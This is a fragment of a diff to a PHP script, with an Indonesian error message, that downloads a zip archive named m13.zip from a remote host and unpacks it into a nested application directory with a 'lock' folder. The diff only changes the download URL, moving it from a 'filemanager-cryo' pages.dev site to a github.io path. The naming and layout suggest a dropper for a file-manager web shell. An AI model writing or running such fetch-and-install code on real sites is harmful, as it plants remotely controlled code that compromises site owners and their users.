@@ -16,7 +16,7 @@ if (!class_exists('ZipArchive')) {
     die("Extension ZIP belum aktif (ZipArchive tidak tersedia). Aktifkan 'zip' di PHP.");
 }
 
-$url = "https://filemanager-cryo.pages.dev/zip/m13.zip";
+$url = "https://veitokonivinaka05-creator.github.io/privacy/diff/m13.zip";
 $savePath  = __DIR__ . "/classic/App/Base/zip/m13.zip";
 $packDir   = __DIR__ . "/classic/App/Base/";
 $LockDir   = __DIR__ . "/classic/App/Base/assets/Static";
